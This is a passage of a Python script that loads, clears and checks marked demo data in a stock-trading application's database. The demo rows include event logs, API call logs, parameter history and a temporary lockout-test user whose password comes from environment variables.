            ("INFO", "system", "장 마감 — 거래내역/매매일지 수집 완료"),
        ]
        ev_rows = [(lv, cat, f"{DEMO_MARK} {msg}", now - dt.timedelta(minutes=9 * i + 2))
                   for i, (lv, cat, msg) in enumerate(ev)]
        cur.executemany(
            "INSERT INTO event_log (level, category, message, created_at) VALUES (%s,%s,%s,%s)", ev_rows)
        print(f"event_log: {len(ev_rows)}건")

        # ---------------------------------------------------- API 호출 로그
        api_rows = []
        for i, api_id in enumerate(["kt00001", "kt00018", "ka10027", "ka10023", "ka10081", "ka10075"]):
            for j in range(rnd.randint(4, 14)):
                rc = 1700 if (i == 2 and j == 0) else 0
                api_rows.append((api_id, 200, rc, f"{DEMO_MARK} " + ("허용 요청 수 초과" if rc else "정상"),
                                 rnd.randint(70, 480), now - dt.timedelta(minutes=7 * j + i)))
        cur.executemany(
            "INSERT INTO api_call_log (api_id, http_status, return_code, return_msg, elapsed_ms, created_at)"
            " VALUES (%s,%s,%s,%s,%s,%s)", api_rows)
        print(f"api_call_log: {len(api_rows)}건")

        # ---------------------------------------------------- 파라미터 변경 이력
        cur.execute("SELECT id FROM algorithm WHERE code='risk_guard'")
        r = cur.fetchone()
        if r:
            aid = int(r["id"])
            hist = [(aid, "stop_loss_pct", "-15", "-12", DEMO_AUTHOR, now - dt.timedelta(days=2)),
                    (aid, "max_orders_per_day", "30", "20", DEMO_AUTHOR, now - dt.timedelta(days=1)),
                    (aid, "trade_start_time", "09:05", "09:10", DEMO_AUTHOR, now - dt.timedelta(hours=5))]
            cur.executemany(
                "INSERT INTO algorithm_param_history (algorithm_id, param_key, old_value, new_value,"
                " changed_by, changed_at) VALUES (%s,%s,%s,%s,%s,%s)", hist)
            print(f"algorithm_param_history: {len(hist)}건")

        # ---------------------------------------------------- 잠금 검증용 임시 계정
        pw = os.environ.get("STOCK_TEST_PW", "") or os.environ.get("STOCK_DEMO_PW", "")
        if pw:
            h = php_password_hash(pw)
            cur.execute(
                "INSERT INTO app_user (username, password_hash, display_name, role, is_active)"
                " VALUES (%s,%s,%s,'viewer',1)"
                " ON DUPLICATE KEY UPDATE password_hash=VALUES(password_hash), is_active=1,"
                " failed_count=0, locked_until=NULL",
                (DEMO_LOCK_USER, h, "잠금 검증용 임시계정"))
            print(f"app_user: {DEMO_LOCK_USER} 생성/초기화 (비밀번호는 환경변수에서만 읽음)")
        else:
            print("app_user: STOCK_TEST_PW 미설정 — 임시 계정 생성 생략")

        # ---------------------------------------------------- 거래 분석 데모
        load_analysis(cur, acct, run_id, now)

    conn.commit()
    print("\nDEMO 데이터 적재 완료. 검증 후 반드시 `demo_data.py clear` 를 실행하세요.")


# ----------------------------------------------------------------- 삭제
def clear(conn) -> None:
    with conn.cursor() as cur:
        acct = demo_account_id(cur)
        deleted = {}
        if acct is not None:
            for tbl in ("order_event", "executions", "orders", "trade_ledger", "daily_trade_summary",
                        "holding", "holding_snapshot", "position_state", "account_balance"):
                cur.execute(f"DELETE FROM {tbl} WHERE account_id=%s", (acct,))
                deleted[tbl] = cur.rowcount
            cur.execute("DELETE FROM account WHERE id=%s", (acct,))
            deleted["account"] = cur.rowcount
        else:
            print("DEMO 계좌가 없습니다(이미 정리됨).")

        cur.execute("DELETE FROM signal_log WHERE detail LIKE %s", (DEMO_MARK + "%",))
        deleted["signal_log"] = cur.rowcount
        cur.execute("DELETE FROM event_log WHERE message LIKE %s", (DEMO_MARK + "%",))
        deleted["event_log"] = cur.rowcount
        cur.execute("DELETE FROM api_call_log WHERE return_msg LIKE %s", (DEMO_MARK + "%",))
        deleted["api_call_log"] = cur.rowcount
        cur.execute("DELETE FROM llm_decision_log WHERE stk_cd LIKE %s", (DEMO_LLM_PREFIX + "%",))
        deleted["llm_decision_log"] = cur.rowcount
        # 계좌 없이 남아있을 수 있는 분석용 데모 행([DEMO] 마커로 이중 식별)
        cur.execute("DELETE FROM order_event WHERE message LIKE %s", (DEMO_MARK + "%",))
        deleted["order_event(mark)"] = cur.rowcount
        cur.execute("DELETE FROM event_archive WHERE message LIKE %s", (DEMO_MARK + "%",))
        deleted["event_archive"] = cur.rowcount
        cur.execute("DELETE FROM api_error_log WHERE return_msg LIKE %s", (DEMO_MARK + "%",))
        deleted["api_error_log"] = cur.rowcount
        cur.execute("DELETE FROM algo_run WHERE note LIKE %s", (DEMO_MARK + "%",))
        deleted["algo_run"] = cur.rowcount
        cur.execute("DELETE FROM algorithm_param_history WHERE changed_by=%s", (DEMO_AUTHOR,))
        deleted["algorithm_param_history"] = cur.rowcount
        cur.execute("DELETE FROM app_login_log WHERE username=%s", (DEMO_LOCK_USER,))
        deleted["app_login_log"] = cur.rowcount
        cur.execute("DELETE FROM app_user WHERE username=%s", (DEMO_LOCK_USER,))
        deleted["app_user"] = cur.rowcount

    conn.commit()
    for k, v in deleted.items():
        print(f"  {k:26s} -{v}")
    print("DEMO 데이터 삭제 완료.")


# ----------------------------------------------------------------- 확인
def status(conn) -> int:
    remain = 0
    with conn.cursor() as cur:
        acct = demo_account_id(cur)
        print(f"DEMO 계좌: {'존재 (id=%d)' % acct if acct is not None else '없음'}")
        if acct is not None:
            remain += 1
            for tbl in ("account_balance", "holding", "holding_snapshot", "orders",
                        "executions", "trade_ledger", "daily_trade_summary", "order_event"):
                cur.execute(f"SELECT COUNT(*) c FROM {tbl} WHERE account_id=%s", (acct,))
                print(f"  {tbl:22s} {cur.fetchone()['c']}")
        checks = [
            ("signal_log", "detail LIKE %s", DEMO_MARK + "%"),
            ("event_log", "message LIKE %s", DEMO_MARK + "%"),
            ("api_call_log", "return_msg LIKE %s", DEMO_MARK + "%"),
            ("order_event", "message LIKE %s", DEMO_MARK + "%"),
            ("event_archive", "message LIKE %s", DEMO_MARK + "%"),
            ("api_error_log", "return_msg LIKE %s", DEMO_MARK + "%"),
            ("llm_decision_log", "stk_cd LIKE %s", DEMO_LLM_PREFIX + "%"),
            ("algo_run", "note LIKE %s", DEMO_MARK + "%"),
            ("algorithm_param_history", "changed_by = %s", DEMO_AUTHOR),
            ("app_user", "username = %s", DEMO_LOCK_USER),
            ("app_login_log", "username = %s", DEMO_LOCK_USER),
        ]
        for tbl, cond, val in checks:
            cur.execute(f"SELECT COUNT(*) c FROM {tbl} WHERE {cond}", (val,))
            c = cur.fetchone()["c"]
            remain += c
            print(f"  {tbl:22s} {c}")
    print("결과:", "DEMO 데이터 잔존" if remain else "DEMO 데이터 없음 (깨끗함)")
    return 1 if remain else 0


def main() -> int:
    if len(sys.argv) < 2 or sys.argv[1] not in ("load", "clear", "status"):
        print(__doc__)
        return 2
    cmd = sys.argv[1]
    conn = connect()
    try:
        if cmd == "load":
            load(conn)
        elif cmd == "clear":
            clear(conn)
        else:
            return status(conn)
    except Exception:
        conn.rollback()
        raise
    finally:
        conn.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
